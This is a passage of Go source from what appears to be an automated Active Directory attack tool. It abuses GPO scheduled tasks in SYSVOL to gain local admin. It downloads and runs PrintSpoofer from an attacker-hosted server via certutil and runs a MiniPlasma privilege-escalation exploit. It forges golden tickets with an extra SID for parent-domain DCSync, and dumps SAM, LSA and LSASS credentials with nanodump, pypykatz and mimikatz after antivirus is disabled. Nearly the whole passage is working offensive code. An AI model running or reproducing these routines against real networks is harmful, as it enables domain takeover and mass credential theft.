	exec core.Executor, domain, user, pass string, result *core.ToolResult) {

	if domain == "" || user == "" || pass == "" {
		return
	}
	if len(state.GPOs) == 0 {
		fmt.Println("[*] GPO abuse: no GPOs in state to attempt")
		return
	}

	dcIP := host.IP
	if dc := findDC(state, domain); dc.IP != "" {
		dcIP = dc.IP
	}

	fmt.Printf("[*] GPO abuse: attempting to add %s to local Administrators via SYSVOL scheduled task (%d GPOs in scope)...\n",
		user, len(state.GPOs))

	taskName := "AdPackEoP"
	payload := fmt.Sprintf("net localgroup Administrators %s\\%s /add", domain, user)
	sysvolPolicy := fmt.Sprintf("%s/Policies", domain)

	for _, gpo := range state.GPOs {
		if gpo.GUID == "" {
			continue
		}

		gpoPath := fmt.Sprintf("%s/%s/Machine", sysvolPolicy, gpo.GUID)
		schedPath := gpoPath + "/Preferences/ScheduledTasks"

		utils.RunCommandCtx(ctx, "smbclient",
			[]string{fmt.Sprintf("//%s/SYSVOL", dcIP),
				"-W", strings.Split(domain, ".")[0],
				"-U", fmt.Sprintf("%s%%%s", user, pass),
				"-c", fmt.Sprintf("mkdir %s", schedPath)})

		// Build and write ScheduledTasks.xml
		taskUID := fmt.Sprintf("{%X-%X-%X-%X-%X}", time.Now().UnixNano(), os.Getpid(), 0, 0, time.Now().UnixMilli()%1000000)
		xmlContent := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4dC0-B71E-58672C36B66E}">
    <Task clsid="{D8896631-F747-47b9-A6F9-1586A01325DA}" name="%s" image="0" changed="%s" uid="%s">
        <Properties action="C" name="%s" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.2">
                <Settings><Enabled>true</Enabled><StartWhenAvailable>true</StartWhenAvailable></Settings>
                <Actions Context="Author">
                    <Execute><Command>cmd.exe</Command><Arguments>/c %s</Arguments></Execute>
                </Actions>
                <Triggers>
                    <RegistrationTrigger><Enabled>true</Enabled><Delay>PT0S</Delay></RegistrationTrigger>
                </Triggers>
            </Task>
        </Properties>
    </Task>
</ScheduledTasks>`, taskName, time.Now().Format("2006-01-02 15:04:05"), taskUID, taskName, payload)

		tmpFile := "/tmp/adpack_gpo_task.xml"
		if err := os.WriteFile(tmpFile, []byte(xmlContent), 0644); err != nil {
			fmt.Printf("[!] GPO abuse: write temp file: %v\n", err)
			continue
		}

		upCR := utils.RunCommandCtx(ctx, "smbclient",
			[]string{fmt.Sprintf("//%s/SYSVOL", dcIP),
				"-W", strings.Split(domain, ".")[0],
				"-U", fmt.Sprintf("%s%%%s", user, pass),
				"-c", fmt.Sprintf("cd %s; put %s ScheduledTasks.xml", schedPath, tmpFile)})
		os.Remove(tmpFile)

		if upCR.ExitCode != 0 {
			continue
		}

		fmt.Printf("[+] GPO abuse: scheduled task deployed to GPO '%s' (%s)\n", gpo.Name, gpo.GUID)
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: "gpo_abuse", Key: gpo.GUID,
			Value:      fmt.Sprintf("scheduled task via GPO %s", gpo.Name),
			Confidence: 0.8, RawOutput: upCR.Stdout, Timestamp: time.Now(),
		})

		// Try gpupdate via nxc (best-effort, may fail without admin)
		gpTarget := tools.NetExecTarget{
			Protocol: "smb", Host: host.IP,
			Domain: domain, Username: user, Password: pass,
		}
		gpCR, gpErr := tools.NetExec.Run(ctx, gpTarget, "-X", []string{"gpupdate /force"})
		if gpErr == nil && tools.NxcCommandSucceeded(gpCR.Stdout+"\n"+gpCR.Stderr) {
			fmt.Println("[*] GPO abuse: gpupdate triggered via nxc")
		} else {
			fmt.Println("[*] GPO abuse: gpupdate not possible (no admin) — waiting for periodic refresh")
		}

		// Poll for admin (brief — the real trigger is periodic gpupdate)
		fmt.Printf("[*] GPO abuse: checking if admin on %s...\n", host.IP)
		cr := utils.RunCommandCtx(ctx, "nxc", []string{
			"smb", host.IP, "-d", domain, "-u", user, "-p", pass,
		})
		if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "(Pwn3d!)") {
			fmt.Printf("[+] GPO abuse: %s is now local admin on %s\n", user, host.IP)
			state.SkipReasons[core.PhasePrivEsc] = core.SkipReason(
				fmt.Sprintf("gpo_elevated:%s:%s", gpo.Name, gpo.GUID))
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: "gpo_abuse", Key: host.IP,
				Value:      fmt.Sprintf("%s is local admin via GPO %s", user, gpo.Name),
				Confidence: 0.9, Timestamp: time.Now(),
			})
			state.Creds = append(state.Creds, core.Credential{
				Type:      core.CredPlaintext,
				Username:  user,
				Domain:    domain,
				Secret:    pass,
				Source:    "gpo_abuse",
				Validated: true,
			})
			return
		}
		fmt.Printf("[i] GPO abuse: admin elevation pending gpupdate on %s\n", host.IP)
	}
}

func runSweetPotatoProbe(ctx context.Context, host core.Host,
	exec core.Executor, domain, user, pass string, result *core.ToolResult) {

	if domain == "" || user == "" || pass == "" {
		return
	}

	// ── Step 1: Upload PrintSpoofer64.exe via certutil ──────────
	kaliIP := os.Getenv("KALI_IP")
	if kaliIP == "" {
		kaliIP = "172.31.125.189"
	}
	port := os.Getenv("KALI_PORT")
	if port == "" {
		port = "18900"
	}
	root := mustGetProjectRoot()

	// Start Python HTTP server to serve files from project root
	srv := startPythonFileServer(root)
	if srv == nil {
		fmt.Println("[-] PrintSpoofer: could not start file server, cannot download payload")
		return
	}
	defer stopCmd(srv)
	time.Sleep(500 * time.Millisecond)

	remoteName := tools.RandString(6) + ".exe"
	remotePath := `C:\Windows\Temp\` + remoteName
	url := fmt.Sprintf("http://%s:%s/PrintSpoofer64.exe", kaliIP, port)

	fmt.Printf("[*] PrintSpoofer: downloading from %s...\n", url)
	dlR := exec.Execute(ctx, core.Action{
		Artifact: fmt.Sprintf("certutil -urlcache -f %s %s", url, remotePath),
		Method:   "mssql_run",
		Timeout:  90 * time.Second,
	})
	if !dlR.Success {
		fmt.Printf("[-] PrintSpoofer: download failed on %s\n", host.IP)
		return
	}

	// ── Step 2: Execute PrintSpoofer to add user to Administrators ──
	addCmd := fmt.Sprintf(`%s -c "net localgroup Administrators %s\%s /add"`, remotePath, domain, user)
	fmt.Printf("[*] PrintSpoofer: executing on %s...\n", host.IP)
	addR := exec.Execute(ctx, core.Action{
		Artifact: addCmd, Method: "mssql_run",
		Timeout: 60 * time.Second,
	})
	if !addR.Success {
		fmt.Printf("[-] PrintSpoofer: execution returned no output on %s\n", host.IP)
		// Still check Pwn3d in case it worked silently
	}
	fmt.Printf("[*] PrintSpoofer: output:\n%s\n", addR.Output)

	// ── Step 3: Verify SMB admin access ─────────────────────────
	cr := utils.RunCommandCtx(ctx, "nxc", []string{
		"smb", host.IP, "-d", domain, "-u", user, "-p", pass,
	})
	if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "(Pwn3d!)") {
		fmt.Printf("[+] PrintSpoofer: %s\\%s is now local admin on %s\n", domain, user, host.IP)
		// Dump SAM and LSA secrets
		dumpSAM(ctx, host, domain, user, pass)
		dumpLSA(ctx, host, domain, user, pass)
	}
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "printspoofer", Key: host.IP,
		Value:      fmt.Sprintf("SYSTEM (via PrintSpoofer) — %s\\%s is admin", domain, user),
		Confidence: 1.0, RawOutput: addR.Output, Timestamp: time.Now(),
	})
}

func startPythonFileServer(root string) *os.Process {
	cmd := exec.Command("python3", "-m", "http.server", "18900", "--directory", root)
	if err := cmd.Start(); err != nil {
		return nil
	}
	return cmd.Process
}

func stopCmd(proc *os.Process) {
	if proc != nil {
		proc.Kill()
	}
}

func mustGetProjectRoot() string {
	cwd, _ := os.Getwd()
	for {
		if _, err := os.Stat(filepath.Join(cwd, "go.mod")); err == nil {
			return cwd
		}
		parent := filepath.Dir(cwd)
		if parent == cwd {
			return cwd
		}
		cwd = parent
	}
}

func dumpSAM(ctx context.Context, host core.Host, domain, user, pass string) {
	cr := utils.RunCommandCtx(ctx, "nxc", []string{
		"smb", host.IP, "-d", domain, "-u", user, "-p", pass, "--sam",
	})
	if cr.ExitCode == 0 {
		// Log the SAM hashes that nxc outputs
		fmt.Printf("[+] SAM dump from %s:\n%s\n", host.IP, cr.Stdout)
	}
}

func dumpLSA(ctx context.Context, host core.Host, domain, user, pass string) {
	cr := utils.RunCommandCtx(ctx, "nxc", []string{
		"smb", host.IP, "-d", domain, "-u", user, "-p", pass, "--lsa",
	})
	if cr.ExitCode == 0 {
		fmt.Printf("[+] LSA secrets from %s:\n%s\n", host.IP, cr.Stdout)
	}
}

func runMiniPlasmaProbe(ctx context.Context, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	remoteDir := `C:\Windows\Temp\`
	var cleanups []string
	defer func() {
		if len(cleanups) > 0 {
			exec.Execute(ctx, core.Action{
				Method: "cleanup", Arguments: cleanups, Timeout: 30 * time.Second,
			})
		}
	}()

	for _, lib := range []string{"NtApiDotNet.dll", "Microsoft.Win32.TaskScheduler.dll"} {
		r := exec.Execute(ctx, core.Action{
			Artifact: lib, Method: "put",
			Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
		})
		if !r.Success {
			return
		}
		cleanups = append(cleanups, r.Output)
	}

	mpPut := exec.Execute(ctx, core.Action{
		Artifact: "MiniPlasma.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !mpPut.Success {
		return
	}
	mpPath := mpPut.Output
	cleanups = append(cleanups, mpPath)

	fmt.Printf("[*] MiniPlasma: executing Cloud Filter EoP on %s...\n", host.IP)
	execR := exec.Execute(ctx, core.Action{
		Artifact: mpPath, Method: "mssql_run",
		Timeout: 60 * time.Second,
	})
	if !execR.Success {
		fmt.Printf("[-] MiniPlasma EoP failed on %s\n", host.IP)
		return
	}

	fmt.Printf("[+] MiniPlasma: exploitation returned success on %s\n", host.IP)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "miniplasma", Key: host.IP, Value: "SYSTEM shell obtained",
		Confidence: 0.7, RawOutput: execR.Output, Timestamp: time.Now(),
	})

	sysR := exec.Execute(ctx, core.Action{
		Method: "mssql_system_check", Timeout: 45 * time.Second,
	})
	if sysR.Success {
		fmt.Printf("[+] MiniPlasma: SYSTEM confirmed on %s (%s)\n", host.IP, sysR.Method)
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: sysR.Method, Key: host.IP, Value: "SYSTEM (via MiniPlasma)",
			Confidence: 1.0, RawOutput: sysR.Output, Timestamp: time.Now(),
		})
	}
}

// runPlanning runs the weighted path planner and logs results.
// Returns a map of target → best ScoredPath for later comparison.
func runPlanning(state *core.ADState, result *core.ToolResult, availCaps []string) map[string]planner.ScoredPath {
	plans := make(map[string]planner.ScoredPath)
	if len(state.Edges) == 0 {
		fmt.Println("[*] No privilege edges found to analyze")
		return plans
	}

	fmt.Println("[*] Planning weighted escalation paths (Dijkstra)...")
	cfg := planner.DefaultConfig()
	cfg.AvailableCaps = availCaps

	totalPlans := 0
	for _, cred := range state.Creds {
		if !cred.Validated {
			continue
		}
		startPrincipal := cred.Domain + "\\" + cred.Username
		paths := planner.New(state, cfg).PlanPaths(startPrincipal)
		for _, plan := range paths {
			totalPlans++
			// Keep the best (lowest cost) path per target
			if existing, ok := plans[plan.Target]; !ok || plan.TotalCost < existing.TotalCost {
				plans[plan.Target] = plan
			}
			fmt.Printf("  ── Plan %d: %s → %s ──\n",
				totalPlans, startPrincipal, plan.Target)
			fmt.Printf("      Score: %.1f (weight=%.1f, noise=%.1f) %s\n",
				plan.TotalCost, plan.TotalWeight, plan.TotalNoise, capsTag(plan.NeededCaps))
			for _, e := range plan.Steps {
				fmt.Printf("       %s → %s → %s [cost=%.1f noise=%.1f]\n",
					e.SourcePrincipal, e.AccessRight, e.TargetPrincipal,
					e.Weight, e.Noise)
			}
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: "planner", Key: startPrincipal,
				Value:      fmt.Sprintf("→ %s (score=%.1f)", plan.Target, plan.TotalCost),
				Confidence: 0.7, RawOutput: formatScoredPath(plan, startPrincipal),
				Timestamp: time.Now(),
			})
		}
	}
	if totalPlans == 0 {
		fmt.Println("  No escalation path found from controlled principals (need more edges)")
	}
	return plans
}

func formatScoredPath(plan planner.ScoredPath, start string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "Score: %.1f | Weight: %.1f | Noise: %.1f", plan.TotalCost, plan.TotalWeight, plan.TotalNoise)
	if len(plan.NeededCaps) > 0 {
		fmt.Fprintf(&b, " | Missing: %s", strings.Join(plan.NeededCaps, ","))
	}
	b.WriteString("\n")
	for _, e := range plan.Steps {
		fmt.Fprintf(&b, "  %s → %s → %s [w=%.0f n=%.1f]\n",
			e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Weight, e.Noise)
	}
	return b.String()
}

func capsTag(caps []string) string {
	if len(caps) == 0 {
		return ""
	}
	return "[!missing:" + strings.Join(caps, ",") + "]"
}

// ExecutePlannedPath executes a single planned path step by step through the
// dispatch → reconcile → ApplyDelta → re-plan cycle. Returns the number of
// steps successfully executed.
func ExecutePlannedPath(ctx context.Context, state *core.ADState, plan planner.ScoredPath, domain, user, pass, hash, targetIP string, result *core.ToolResult) int {
	if len(plan.Steps) == 0 {
		return 0
	}

	fmt.Printf("\n[*] Executing planned path: %s → %s (score=%.1f)\n",
		plan.Steps[0].SourcePrincipal, plan.Target, plan.TotalCost)

	executed := 0
	for i, step := range plan.Steps {
		cap := core.AccessRightToCapability(step)
		fmt.Printf("  Step %d/%d: %s → %s via %s [%s]\n",
			i+1, len(plan.Steps), step.SourcePrincipal, step.TargetPrincipal, step.AccessRight, cap)

		verdict, err := ExecuteAndReconcile(ctx, step, cap, state, domain, user, pass, hash, targetIP)
		if err != nil {
			fmt.Printf("    ✗ Dispatch failed: %v\n", err)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: "dispatch", Key: string(cap),
				Value: fmt.Sprintf("FAIL: %v", err), Confidence: 0.0,
				Timestamp: time.Now(),
			})
			continue
		}

		if !verdict.Trustworthy {
			fmt.Printf("    ✗ Reconciliation failed: %s\n", verdict.Summary)
			for _, m := range verdict.Mismatches {
				fmt.Printf("       mismatch: %s (expected=%s, actual=%s)\n",
					m.Field, m.Expected, m.Actual)
			}
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: "reconcile", Key: string(cap),
				Value:      fmt.Sprintf("RECONCILE_FAIL: %s", verdict.Summary),
				Confidence: verdict.Confidence, Timestamp: time.Now(),
			})
			continue
		}

		// Get executor prediction and apply delta
		exec, status := CapabilityRegistry.Resolve(cap)
		if status != core.CapabilityAvailable || exec == nil {
			fmt.Printf("    ✗ No executor for %s\n", cap)
			continue
		}
		predicted := exec.Execute(ctx, step, state)
		changed := core.ApplyDelta(state, predicted.Delta)
		executed++

		fmt.Printf("    ✓ Executed (confidence=%.2f) edges=%d changed=%v\n",
			verdict.Confidence, len(predicted.Delta.NewEdges), changed)

		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: "path_exec", Key: string(cap),
			Value:      fmt.Sprintf("%s→%s (conf=%.2f)", step.SourcePrincipal, step.TargetPrincipal, verdict.Confidence),
			Confidence: verdict.Confidence, Timestamp: time.Now(),
		})

		// Re-plan after mutation to discover new paths
		fmt.Println("    ↻ Re-planning after state mutation...")
		cfg := planner.DefaultConfig()
		cfg.AvailableCaps = getAvailableCaps()
		newPaths := planner.New(state, cfg).PlanPaths(step.SourcePrincipal)
		if len(newPaths) > 0 {
			best := newPaths[0]
			fmt.Printf("    ↻ New path emerges: %s → %s (score=%.1f, %d steps)\n",
				step.SourcePrincipal, best.Target, best.TotalCost, len(best.Steps))
		} else {
			fmt.Println("    ↻ No new paths from this principal after mutation")
		}
	}

	if executed > 0 {
		fmt.Printf("[+] Path execution complete: %d/%d steps successful\n",
			executed, len(plan.Steps))
	}
	return executed
}

// ExecuteBestPaths runs the highest-value planned paths through the
// dispatch → reconcile → ApplyDelta → re-plan loop. Returns the total
// number of path steps executed across all paths.
func ExecuteBestPaths(ctx context.Context, state *core.ADState, plans map[string]planner.ScoredPath, targetIP string, result *core.ToolResult) int {
	if len(plans) == 0 {
		return 0
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for path execution")
		return 0
	}

	total := 0
	for _, plan := range plans {
		n := ExecutePlannedPath(ctx, state, plan, domain, user, pass, hash, targetIP, result)
		total += n
	}
	return total
}

// getAvailableCaps reports which TOOLS are installed on the operator's
// box. The planner's PlannerConfig.AvailableCaps is matched against
// each PrivilegeEdge.Requires (which holds tool names like "nxc",
// "impacket-getST", "bloodyAD"), so this must be a tool-availability
// list, not a list of capability identifiers.
//
// Edges whose Requires don't appear here are penalised by the planner's
// tooling-gap term but never excluded — they remain reachable.
func getAvailableCaps() []string {
	candidates := []string{
		// Network execution & SMB
		"nxc", "netexec", "crackmapexec",
		// AD manipulation
		"bloodyAD", "ldapsearch",
		// Impacket suite
		"impacket-secretsdump", "impacket-GetUserSPNs", "impacket-GetNPUsers",
		"impacket-getTGT", "impacket-getST", "impacket-ticketer",
		"impacket-psexec", "impacket-wmiexec", "impacket-smbexec",
		"impacket-ntlmrelayx",
		// AD CS
		"certipy", "certipy-ad",
		// Shadow credentials
		"pywhisker", "certipy-shadow",
		// Coercion & relay
		"coercer", "PetitPotam.py", "dfscoerce.py",
		"responder", "ntlmrelayx.py",
		// IPv6 attacks
		"mitm6",
		// Tickets
		"krbrelayx.py", "addspn.py",
	}
	available := make(map[string]bool)
	for _, t := range candidates {
		if utils.ToolAvailable(t) {
			available[t] = true
			addToolAliases(available, t)
		}
	}
	var out []string
	for _, t := range candidates {
		if available[t] {
			out = append(out, t)
			delete(available, t)
		}
	}
	for t := range available {
		out = append(out, t)
	}
	return out
}

func addToolAliases(available map[string]bool, tool string) {
	switch tool {
	case "certipy-ad", "certipy":
		available["certipy"] = true
		available["certipy-ad"] = true
	case "nxc", "netexec", "crackmapexec":
		available["nxc"] = true
		available["netexec"] = true
		available["mssql"] = true
	case "ntlmrelayx.py", "impacket-ntlmrelayx":
		available["ntlmrelayx"] = true
		available["ntlmrelayx.py"] = true
		available["impacket-ntlmrelayx"] = true
	case "coercer", "impacket-coercer":
		available["coercer"] = true
		available["impacket-coercer"] = true
	}
}

// printConfidenceHealth logs a summary of edge confidence distribution
// and flags stale / suspect edges for operator awareness.
func printConfidenceHealth(edges []core.PrivilegeEdge) {
	if len(edges) == 0 {
		return
	}
	var high, medium, low, stale, suspect int
	for _, e := range edges {
		if e.Confidence >= 0.8 {
			high++
		} else if e.Confidence >= 0.5 {
			medium++
		} else if e.Confidence >= 0.0 {
			low++
		}
		if e.Stale(time.Hour) && !e.LastVerifiedAt.IsZero() {
			stale++
		}
		if e.ValidationState == core.EdgeStale || e.Confidence < 0.3 {
			suspect++
		}
	}
	fmt.Printf("[*] Edge confidence health: %d total | %d high | %d medium | %d low | %d stale | %d suspect\n",
		len(edges), high, medium, low, stale, suspect)
	if suspect > 0 {
		fmt.Println("    ⚠ Suspect edges detected — planner will deprioritise these paths")
	}
}

func classifyDelta(credsBefore, edgesBefore int, state *core.ADState) DeltaClass {
	if len(state.Creds) > credsBefore {
		return DeltaCredential
	}
	if len(state.Edges) > edgesBefore {
		return DeltaEdge
	}
	return DeltaNoise
}

func hasValidatedDA(state *core.ADState) bool {
	for _, c := range state.Creds {
		if c.Validated && strings.Contains(strings.ToUpper(c.Username), "ADMINISTRATOR") {
			return true
		}
		if c.Validated && strings.Contains(strings.ToUpper(c.Username), "KRBTGT") {
			return true
		}
	}
	return false
}

func runChildToParentEscalation(state *core.ADState, result *core.ToolResult) {
	childDC, parentDC := findChildParentDCs(state)
	if childDC == nil || parentDC == nil {
		return
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		return
	}

	fmt.Printf("[*] Child-to-parent: attempting %s(%s) → %s(%s)...\n",
		childDC.Hostname, childDC.Domain, parentDC.Hostname, parentDC.Domain)

	if _, err := utils.FindTool("impacket-secretsdump"); err != nil {
		fmt.Println("[!] impacket-secretsdump not found, skipping child-to-parent")
		return
	}
	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
		fmt.Println("[!] impacket-ticketer not found, skipping child-to-parent")
		return
	}
	if _, err := utils.FindTool("impacket-lookupsid"); err != nil {
		fmt.Println("[!] impacket-lookupsid not found, skipping child-to-parent")
		return
	}

	// Step 1: DCSync child krbtgt
	authSpec := buildImpacketAuth(domain, user, pass, hash, childDC.IP)
	args := []string{authSpec, "-just-dc-user", "krbtgt"}
	args = append(args, impacketHashArgs(hash)...)
	fmt.Printf("[*] Child-to-parent: DCSyncing krbtgt from %s...\n", childDC.IP)
	r := utils.RunCommandTimeout(2*time.Minute, "impacket-secretsdump", args)
	if !r.Success {
		fmt.Printf("[-] Child-to-parent: secretsdump failed on %s\n", childDC.IP)
		return
	}
	krbtgtHash := extractKrbtgtNTHash(r.Stdout)
	if krbtgtHash == "" {
		fmt.Println("[-] Child-to-parent: krbtgt hash not found in secretsdump output")
		return
	}

	// Step 2: Get child domain SID
	childSID := resolveDomainSID(domain, user, pass, hash, childDC.IP)
	if childSID == "" {
		fmt.Println("[-] Child-to-parent: could not resolve child domain SID")
		return
	}

	// Step 3: Get parent domain SID
	parentSID := resolveDomainSID(parentDC.Domain, user, pass, hash, parentDC.IP)
	if parentSID == "" {
		// Some versions of lookupsid work with cross-domain principals
		auth := buildImpacketAuth(domain, user, pass, hash, parentDC.IP)
		lr := utils.RunCommandTimeout(45*time.Second, "impacket-lookupsid",
			[]string{auth, "0"})
		if lr.Success {
			m := domainSIDRe.FindStringSubmatch(lr.Stdout)
			if len(m) >= 2 {
				parentSID = m[1]
			}
		}
	}
	if parentSID == "" {
		fmt.Println("[-] Child-to-parent: could not resolve parent domain SID")
		return
	}

	// Step 4: Forge golden ticket with extra SID
	extraSID := parentSID + "-519" // Enterprise Admins
	fmt.Printf("[*] Child-to-parent: forging golden ticket (extra-sid=%s)...\n", extraSID)
	ccacheUser := "Administrator"
	ccachePath := fmt.Sprintf("/tmp/childtoparent_%s.ccache", ccacheUser)
	tArgs := []string{
		"-nthash", krbtgtHash,
		"-domain-sid", childSID,
		"-domain", domain,
		"-extra-sid", extraSID,
		ccacheUser,
	}
	tr := utils.RunCommandTimeout(60*time.Second, "impacket-ticketer", tArgs)
	if !tr.Success {
		fmt.Printf("[-] Child-to-parent: ticketer failed: %s\n", tr.Stderr)
		return
	}
	// Move ccache to predictable path
	utils.RunCommandTimeout(10*time.Second, "mv",
		[]string{fmt.Sprintf("%s.ccache", ccacheUser), ccachePath})

	// Step 5: DCSync parent domain using forged ticket
	fmt.Printf("[*] Child-to-parent: DCSyncing %s with forged ticket...\n", parentDC.IP)
	secretsdumpArgs := []string{"-k", "-no-pass",
		fmt.Sprintf("%s.%s", parentDC.Hostname, parentDC.Domain),
		"-just-dc"}
	envCmd := fmt.Sprintf("KRB5CCNAME=%s impacket-secretsdump", ccachePath)
	// We need to call secretsdump with the env var set
	dcsyncR := utils.RunCommandTimeout(2*time.Minute, "sh",
		[]string{"-c", fmt.Sprintf("%s %s", envCmd, strings.Join(secretsdumpArgs, " "))})
	if dcsyncR.Success && strings.Contains(dcsyncR.Stdout, "krbtgt") {
		fmt.Printf("[+] Child-to-parent: DCSync of %s succeeded!\n", parentDC.Hostname)
	}

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "child_to_parent", Key: parentDC.IP,
		Value:      fmt.Sprintf("Parent DCSync via extra-sid golden ticket (%s→%s)", domain, parentDC.Domain),
		Confidence: 0.9, RawOutput: dcsyncR.Stdout, Timestamp: time.Now(),
	})
}

func findChildParentDCs(state *core.ADState) (child, parent *core.Host) {
	var dcs []*core.Host
	for i := range state.Hosts {
		if state.Hosts[i].IsDC {
			dcs = append(dcs, &state.Hosts[i])
		}
	}
	if len(dcs) < 2 {
		return nil, nil
	}
	// Heuristic: the DC whose domain contains another DC's domain is the parent
	// (e.g., sevenkingdoms.local contains north.sevenkingdoms.local)
	for _, a := range dcs {
		for _, b := range dcs {
			if a.IP == b.IP {
				continue
			}
			if a.Domain != "" && b.Domain != "" &&
				strings.HasSuffix(b.Domain, "."+a.Domain) {
				return b, a // b is child of a
			}
		}
	}
	// Fallback: alphabetical domain name = parent (unreliable but works for GOAD)
	return nil, nil
}

func doSystemCheckAndDump(ctx context.Context, state *core.ADState, host core.Host,
	exec core.Executor, domain, user, pass string, result *core.ToolResult, source string) bool {

	r := exec.Execute(ctx, core.Action{
		Target:  core.HostRef{Name: host.IP, Domain: domain},
		Method:  "system_check",
		Timeout: 45 * time.Second,
	})
	if !r.Success {
		return false
	}

	fmt.Printf("[+] SYSTEM access confirmed on %s (%s, source=%s)\n", host.IP, r.Method, source)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: source, Key: host.IP, Value: "SYSTEM",
		Confidence: 1.0, RawOutput: r.Output, Timestamp: time.Now(),
	})

	fmt.Printf("[*] Dumping credentials from %s via SAM + LSA secrets...\n", host.IP)
	for _, flag := range []string{"--sam", "--lsa"} {
		dumpTarget := tools.NetExecTarget{
			Protocol: "smb", Host: host.IP,
			Domain: domain, Username: user, Password: pass,
		}
		cr, err := tools.NetExec.Run(ctx, dumpTarget, flag, nil)
		if err != nil {
			continue
		}
		hashes := ParseNTLMOutput(cr.Stdout)
		if len(hashes) == 0 {
			continue
		}
		for _, h := range hashes {
			state.Creds = append(state.Creds, core.Credential{
				Type: core.CredHash, Username: h.Username,
				Domain: domain, Hash: h.Hash,
				Source: "privesc_dump", Validated: true,
			})
			if EnqueueHash != nil {
				EnqueueHash("ntlm", h.Hash, h.Username, domain)
			}
		}
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
			Source: flag, Key: host.IP,
			Value:      fmt.Sprintf("%d credentials dumped via %s", len(hashes), flag),
			Confidence: 1.0, RawOutput: cr.Stdout, Timestamp: time.Now(),
		})
		fmt.Printf("[+] %s: %d credential(s) extracted from %s\n", flag, len(hashes), host.IP)
	}
	return true
}

// runDeepCredDump performs deep credential extraction after AV has been disabled.
// Cascades through available tools: go-mimikatz → nanodump+pypykatz → nxc SAM/LSA.
func runDeepCredDump(ctx context.Context, state *core.ADState, host core.Host,
	exec core.Executor, domain, user, pass string, result *core.ToolResult) {

	utils.Step("Deep credential dump (post-evasion)...")
	dumped := 0

	// Tier 1: go-mimikatz (richest output: plaintext + hashes)
	if tools.GoMimikatz.Available() {
		r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
		if err == nil && r != nil && r.Success {
			creds := parseMimikatzOutput(r.Stdout)
			for _, c := range creds {
				if c.Domain == "" {
					c.Domain = domain
				}
				state.Creds = append(state.Creds, c)
			}
			dumped += len(creds)
			if len(creds) > 0 {
				utils.StepOk(fmt.Sprintf("go-mimikatz: %d credential(s)", len(creds)))
			}
		}
	}

	// Tier 2: nanodump + pypykatz (LSASS dump, reliable)
	if tools.Nanodump.Available() {
		ndLocal := findNanodump()
		if ndLocal != "" {
			remoteDir := `C:\Windows\Temp\`
			deployR := exec.Execute(ctx, core.Action{
				Artifact: ndLocal, Method: "put",
				Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
			})
			if deployR.Success {
				ndPath := deployR.Output
				dumpFile := fmt.Sprintf(`%s\lsass_%d.dmp`, remoteDir, time.Now().UnixNano())
				defer exec.Execute(ctx, core.Action{
					Method: "cleanup", Arguments: []string{ndPath, dumpFile}, Timeout: 15 * time.Second,
				})

				target := tools.NetExecTarget{
					Protocol: "smb", Host: host.IP,
					Domain: domain, Username: user, Password: pass,
				}
				cmd := fmt.Sprintf(`%s --write %s --fork`, ndPath, dumpFile)
				cr, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
				if err == nil && cr.Success {
					localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_%d.dmp", time.Now().UnixNano()))
					getR := exec.Execute(ctx, core.Action{
						Artifact: dumpFile, Method: "get",
						Arguments: []string{localDump}, Timeout: 60 * time.Second,
					})
					if getR.Success {
						defer os.Remove(localDump)
						pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
						if pyr.Success {
							creds := parseNanodumpOutput(pyr.Stdout)
							for _, c := range creds {
								if c.Domain == "" {
									c.Domain = domain
								}
								state.Creds = append(state.Creds, c)
								if EnqueueHash != nil && c.Hash != "" {
									EnqueueHash("ntlm", c.Hash, c.Username, domain)
								}
							}
							dumped += len(creds)
							if len(creds) > 0 {
								utils.StepOk(fmt.Sprintf("nanodump+pypykatz: %d credential(s)", len(creds)))
							}
						}
					}
				}
			}
		}
	}

	if dumped > 0 {
		utils.StepOk(fmt.Sprintf("Deep dump complete: %d total credential(s) extracted", dumped))
	} else {
		utils.StepInfo("No additional creds from deep dump (SAM/LSA already captured)")
	}
}

// findNanodump locates the nanodump binary for deployment.
func findNanodump() string {
	if utils.ToolAvailable("nanodump") {
		return "nanodump"
	}
